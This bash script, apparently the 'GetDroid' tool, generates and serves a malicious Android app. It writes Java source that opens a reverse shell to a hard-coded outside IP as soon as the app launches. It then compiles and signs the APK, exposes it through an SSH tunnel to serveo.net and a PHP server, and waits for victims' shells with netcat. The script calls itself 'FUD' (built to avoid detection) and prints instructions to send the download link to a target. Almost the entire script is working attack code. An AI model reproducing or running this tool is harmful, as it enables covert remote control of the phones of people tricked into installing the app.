#!/bin/bash
# GetDroid v1.1
# FUD Android Payload Generator and Listener
# Coded by @thelinuxchoice
# Github: https://github.com/thelinuxchoice/getdroid

trap 'printf "\n";stop' 2

stop() {

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1


}

dependencies() {

command -v javac > /dev/null 2>&1 || { echo >&2 "I require Java but it's not installed. Install it. Aborting."; exit 1; }

command -v aapt > /dev/null 2>&1 || { echo >&2 "I require aapt but it's not installed. Install it. Aborting."; 
exit 1; }
command -v apksinger > /dev/null 2>&1 || { echo >&2 "I require apksinger but it's not installed. Install it. Aborting."; 
exit 1; }
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; 
exit 1; }
command -v nc > /dev/null 2>&1 || { echo >&2 "I require Netcat but it's not installed. Install it. Aborting."; 
exit 1; }
command -v dx > /dev/null 2>&1 || { echo >&2 "I require dx but it's not installed. Install it (Android-SDK Tools). Aborting."; 
exit 1; }

}

banner() {

printf "\n\n"
printf "   ██████╗ ███████╗████████╗\e[1;92m██████╗ ██████╗  ██████╗ ██╗██████╗  \e[0m\n"
printf "  ██╔════╝ ██╔════╝╚══██╔══╝\e[1;92m██╔══██╗██╔══██╗██╔═══██╗██║██╔══██╗ \e[0m\n"
printf "  ██║  ███╗█████╗     ██║   \e[1;92m██║  ██║██████╔╝██║   ██║██║██║  ██║ \e[0m\n"
printf "  ██║   ██║██╔══╝     ██║   \e[1;92m██║  ██║██╔══██╗██║   ██║██║██║  ██║ \e[0m\n"
printf "  ╚██████╔╝███████╗   ██║   \e[1;92m██████╔╝██║  ██║╚██████╔╝██║██████╔╝ \e[0m\n"
printf "   ╚═════╝ ╚══════╝   ╚═╝   \e[1;92m╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝╚═════╝  \e[0m\n"
printf "\n"                                                              
printf "\e[1;77m       .:.:\e[0m\e[1;93m FUD Android payload generator and listener \e[0m\e[1;77m:.:.\e[0m\n"                              
printf "\e[1;93m               .:.:\e[0m\e[1;92m Coded by:\e[0m\e[1;77m@thelinuxchoice\e[0m \e[1;93m:.:.\e[0m\n"
printf "\n"
printf "            \e[101m:: Warning: Attacking targets without  ::\e[0m\n"
printf "            \e[101m:: prior mutual consent is illegal!    ::\e[0m\n"
printf "\n"


}
createapp() {
mkdir -p src/com/example/reversedroid/

printf "package com.example.reversedroid;\n" > src/com/example/reversedroid/MainActivity.java
printf "import java.io.IOException;\n" >> src/com/example/reversedroid/MainActivity.java
printf "import java.io.InputStream;\n" >> src/com/example/reversedroid/MainActivity.java
printf "import java.io.OutputStream;\n" >> src/com/example/reversedroid/MainActivity.java
printf "import java.net.Socket;\n" >> src/com/example/reversedroid/MainActivity.java
printf "import android.app.Activity;\n" >> src/com/example/reversedroid/MainActivity.java
printf "import android.os.Bundle;\n" >> src/com/example/reversedroid/MainActivity.java
printf "import android.util.Log;\n" >> src/com/example/reversedroid/MainActivity.java
printf "import android.view.Menu;\n" >> src/com/example/reversedroid/MainActivity.java
printf "import android.widget.TextView;\n" >> src/com/example/reversedroid/MainActivity.java
printf "public class MainActivity extends Activity {\n" >> src/com/example/reversedroid/MainActivity.java
printf "   @Override\n" >> src/com/example/reversedroid/MainActivity.java
printf "   protected void onCreate(Bundle savedInstanceState) {\n" >> src/com/example/reversedroid/MainActivity.java
printf "      super.onCreate(savedInstanceState);\n" >> src/com/example/reversedroid/MainActivity.java
printf "      setContentView(R.layout.activity_main);\n" >> src/com/example/reversedroid/MainActivity.java
printf "      new Thread(new Runnable(){\n" >> src/com/example/reversedroid/MainActivity.java
printf "			@Override\n" >> src/com/example/reversedroid/MainActivity.java
printf "			public void run() {\n" >> src/com/example/reversedroid/MainActivity.java
printf "				try {\n" >> src/com/example/reversedroid/MainActivity.java
printf "					reverseShell();\n" >> src/com/example/reversedroid/MainActivity.java
printf "				} catch (Exception e) {\n" >> src/com/example/reversedroid/MainActivity.java
printf "					Log.e(\"Error\", e.getMessage());\n" >> src/com/example/reversedroid/MainActivity.java
printf "				}\n" >> src/com/example/reversedroid/MainActivity.java
printf "			}\n" >> src/com/example/reversedroid/MainActivity.java
printf "		}).start();\n" >> src/com/example/reversedroid/MainActivity.java
printf "   }\n" >> src/com/example/reversedroid/MainActivity.java
printf " 	public void reverseShell() throws Exception {\n" >> src/com/example/reversedroid/MainActivity.java
printf "		final Process process = Runtime.getRuntime().exec(\"system/bin/sh\");\n" >> src/com/example/reversedroid/MainActivity.java
printf "		Socket socket = new Socket(\"159.89.214.31\", %s);\n" $default_port3 >> src/com/example/reversedroid/MainActivity.java
printf "		forwardStream(socket.getInputStream(), process.getOutputStream());\n" >> src/com/example/reversedroid/MainActivity.java
printf "		forwardStream(process.getInputStream(), socket.getOutputStream());\n" >> src/com/example/reversedroid/MainActivity.java
printf "		forwardStream(process.getErrorStream(), socket.getOutputStream());\n" >> src/com/example/reversedroid/MainActivity.java
printf "		process.waitFor();\n" >> src/com/example/reversedroid/MainActivity.java
printf "		socket.getInputStream().close();\n" >> src/com/example/reversedroid/MainActivity.java
printf "		socket.getOutputStream().close();\n" >> src/com/example/reversedroid/MainActivity.java
printf "	}\n" >> src/com/example/reversedroid/MainActivity.java
printf "	private static void forwardStream(final InputStream input, final OutputStream output) {\n" >> src/com/example/reversedroid/MainActivity.java
printf "		new Thread(new Runnable() {\n" >> src/com/example/reversedroid/MainActivity.java
printf "			@Override\n" >> src/com/example/reversedroid/MainActivity.java
printf "			public void run() {\n" >> src/com/example/reversedroid/MainActivity.java
printf "				try {\n" >> src/com/example/reversedroid/MainActivity.java
printf "					final byte[] buf = new byte[4096];\n" >> src/com/example/reversedroid/MainActivity.java
printf "					int length;\n" >> src/com/example/reversedroid/MainActivity.java
printf "					while ((length = input.read(buf)) != -1) {\n" >> src/com/example/reversedroid/MainActivity.java
printf "						if (output != null) {\n" >> src/com/example/reversedroid/MainActivity.java
printf "							output.write(buf, 0, length);\n" >> src/com/example/reversedroid/MainActivity.java
printf "							if (input.available() == 0) {\n" >> src/com/example/reversedroid/MainActivity.java
printf "								output.flush();\n" >> src/com/example/reversedroid/MainActivity.java
printf "							}\n" >> src/com/example/reversedroid/MainActivity.java
printf "						}\n" >> src/com/example/reversedroid/MainActivity.java
printf "					}\n" >> src/com/example/reversedroid/MainActivity.java
printf "				} catch (Exception e) {\n" >> src/com/example/reversedroid/MainActivity.java
printf "				} finally {\n" >> src/com/example/reversedroid/MainActivity.java
printf "					try {\n" >> src/com/example/reversedroid/MainActivity.java
printf "						input.close();\n" >> src/com/example/reversedroid/MainActivity.java
printf "						output.close();\n" >> src/com/example/reversedroid/MainActivity.java
printf "					} catch (IOException e) {\n" >> src/com/example/reversedroid/MainActivity.java
printf "					}\n" >> src/com/example/reversedroid/MainActivity.java
printf "				}\n" >> src/com/example/reversedroid/MainActivity.java
printf "			}\n" >> src/com/example/reversedroid/MainActivity.java
printf "		}).start();\n" >> src/com/example/reversedroid/MainActivity.java
printf "	}\n" >> src/com/example/reversedroid/MainActivity.java





printf "}\n" >> src/com/example/reversedroid/MainActivity.java

}

compile() {
createapp
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Compiling... \e[0m\n"
aapt package -f -m -J src/ -M AndroidManifest.xml -S res/ -I tools/android-sdk/platforms/android-19/android.jar
javac -d obj/ -classpath src/ -bootclasspath tools/android-sdk/platforms/android-19/android.jar src/com/example/reversedroid/*.java -source 1.7 -target 1.7
dx --dex --output=bin/classes.dex obj/
aapt package -f -m -F bin/$payload_name.apk -M AndroidManifest.xml -S res/ -I tools/android-sdk/platforms/android-19/android.jar
cp bin/classes.dex .
aapt add bin/$payload_name.apk classes.dex > /dev/null
echo "      " | apksigner sign --ks tools/key.keystore bin/$payload_name.apk > /dev/null
mv bin/$payload_name.apk $payload_name.apk
rm -rf classes.dex
}

server() {
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:$port serveo.net -R $default_port3:localhost:$default_port2 2> /dev/null &
sleep 3
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the first link to target + /%s.apk:\e[0m\e[1;77m \n' $payload_name
php -S localhost:$port > /dev/null 2>&1 &
sleep 3
printf "\n"
printf '\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting connection...\e[0m\n'
printf "\n"
nc -lvp $default_port2

}

start() {
chmod +x tools/*
default_port=$(seq 1111 4444 | sort -R | head -n1)
default_port2=$(seq 1111 4444 | sort -R | head -n1)
default_port3=$(seq 1111 4444 | sort -R | head -n1)
printf '\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
read port
port="${port:-${default_port}}"
default_payload_name="payload"
printf '\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Payload name (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_payload_name
read payload_name
payload_name="${payload_name:-${default_payload_name}}"
compile
server

}
#banner
dependencies
start
